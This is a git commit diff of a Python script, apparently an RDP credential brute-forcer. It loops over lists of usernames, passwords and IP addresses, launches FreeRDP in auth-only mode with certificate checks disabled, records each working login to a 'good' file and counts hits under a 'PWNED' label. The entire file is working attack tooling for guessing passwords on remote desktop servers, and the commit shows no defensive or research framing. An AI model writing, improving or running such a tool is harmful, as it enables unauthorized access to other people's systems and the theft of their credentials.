1f52d4303b3c8eec7d61d9aa3cdc7bcf62c30dba
3.13.1.5 <35502476+TheDevFromKer@users.noreply.github.com>
2019-09-10 22:31:45 +0200

    v2
    [+] Fixed unclosed xFreeRDP app, added extra close
    [+] New look
    [+] Windows/Linux passed

--- start.py
+++ start.py
@@ -1,6 +1,7 @@
 import asyncio
-from asyncio import create_subprocess_shell as run
+from asyncio import create_subprocess_exec as run
 from asyncio.subprocess import DEVNULL
+from collections.abc import AsyncGenerator
 from platform import system as sys_ver
 
 from aiofiles import open as afile
@@ -9,74 +10,107 @@ from async_timeout import timeout as ftime
 
 # OS Detect
 if sys_ver() == 'Windows':
-    fr_name = 'wfreerdp.exe'
+    APP = 'wfreerdp.exe'
 else:
-    fr_name = 'xfreerdp'
+    APP = 'xfreerdp'
 
 
-async def connect(ip: str, user: str, password: str) -> str:
-    r_agr = f"{fr_name} /v:{ip} /port:{PORT} /u:'{user}' " + \
-            f"/p:'{password}' /cert-ignore +auth-only " + \
-            '+compression /sec:nla'
+class RDP_Checker:
+    __slots__ = ('good', 'total', 'threads', 'port', 'timeout')
 
-    a = await run(r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)
+    def __init__(self):
+        self.good = 0
+        self.total = 0
 
-    try:
-        async with ftime(TIMEOUT):
-            await a.communicate()
+        self.threads = int(input('Threads: ') or 1)
+        self.port = int(input('Port: ') or 3309)
+        self.timeout = int(input('Timeout: ') or 10)
 
-        assert a.returncode == 0
+        print('PWNED | TOTAL')
 
-        rez = f'{ip}:{PORT};{user}:{password}\n'
+    def __stats__(self, last: bool = False) -> None:
+        print(f'{self.good} | {self.total}', end='\n' if last else '\r')
 
-        async with afile(f'good.txt', 'a', encoding='utf-8',
+    def kill(self, pid: int) -> list:
+        if sys_ver() == 'Windows':
+            return f'taskkill /PID {pid} /F'.split(' ')
+        else:
+            return f'kill -9 {pid}'.split(' ')
+
+    async def __extra_kill__(self, pid: str):
+        a = await run(*self.kill(pid), limit=0, stdout=DEVNULL, stderr=DEVNULL)
+        await a.communicate()
+
+    async def __read_file__(self, file: str) -> AsyncGenerator:
+        async with afile(file, errors="ignore", encoding="utf-8") as lines:
+            async for line in lines:
+                yield line.strip()
+
+    async def __save__(self, data: str) -> None:
+        async with afile(f'rez/good.txt', 'a', encoding='utf-8',
                          errors='ignore') as f:
-            await f.write(rez)
+            await f.write(data)
 
-        return 'g'
-    except Exception:
-        await a.kill()
+    async def connect(self, ip: str, user: str, password: str) -> None:
+        # Arguments for run FreeRDP
+        r_agr = [
+            f"/v:{ip} ",  # IP for connect
+            f"/port:{self.port} ",  # Base port for connect
+            f"/u:'{user}' ",  # Username param
+            f"/p:'{password}' ",  # Password param, !doesn't work with empty!
+            "/cert-ignore ",  # Ignore cert errors
+            "+auth-only ",  # Says: "We want only login and outing"
+            "+compression ",  # Using some compression for cut traffic
+            "/sec:nla"  # Default
+        ]
 
+        a = await run(APP, *r_agr, limit=0, stdout=DEVNULL, stderr=DEVNULL)
 
-async def start() -> None:
-    good = 0
-    total = 0
-    tasks = []
+        try:
+            async with ftime(self.timeout):
+                await a.communicate()
 
-    async with afile('data/users.txt', errors="ignore",
-                     encoding="utf-8") as users:
-        async for user in users:
-            async with afile('data/passwords.txt', errors="ignore",
-                             encoding="utf-8") as passws:
-                async for passw in passws:
-                    async with afile('data/ip.txt', errors="ignore",
-                                     encoding="utf-8") as ips:
-                        async for ip in ips:
-                            tasks.append(asyncio.create_task(connect(
-                                ip.strip(),
-                                user.strip(),
-                                passw.strip()
-                            )))
+            assert a.returncode == 0
+            await self.__save__(f'{ip}:{self.port};{user}:{password}\n')
 
-                            if len(tasks) == THREADS:
-                                for rez in await asyncio.gather(*tasks):
-                                    if rez:
-                                        good += 1
+            self.good += 1
+        except asyncio.TimeoutError:
+            await self.__extra_kill__(a.pid)
+        except AssertionError:
+            pass
+        finally:
+            self.total += 1
 
-                                    total += 1
+    async def main(self) -> None:
+        tasks = []
 
-                                print(f'Good: {good}; Total: {total}', end='\r')
-                                tasks = []
+        async for user in self.__read_file__('data/users.txt'):
+            async for passw in self.__read_file__('data/passwords.txt'):
+                async for ip in self.__read_file__('data/ip.txt'):
+                    tasks.append(asyncio.ensure_future(self.connect(
+                        ip,
+                        user,
+                        passw
+                    )))
 
-    if len(tasks) != 0:
-        await asyncio.gather(*tasks)
+                    if len(tasks) == self.threads:
+                        await asyncio.gather(*tasks)
+                        self.__stats__()
+                        tasks.clear()
+
+        self.__stats__(True)
+
+        if len(tasks) != 0:
+            await asyncio.gather(*tasks)
 
 
 if __name__ == "__main__":
-    THREADS = int(input('Threads: '))
-    TIMEOUT = int(input('Timeout: '))
-    PORT = int(input('Port: ') or 3389)
+    if sys_ver() == 'Windows':
+        loop = asyncio.ProactorEventLoop()
+        asyncio.set_event_loop(loop)
+    else:
+        loop = asyncio.get_event_loop()
 
-    loop = asyncio.new_event_loop()
-    loop.run_until_complete(start())
+    action = RDP_Checker()
+    loop.run_until_complete(action.main())
     loop.close()
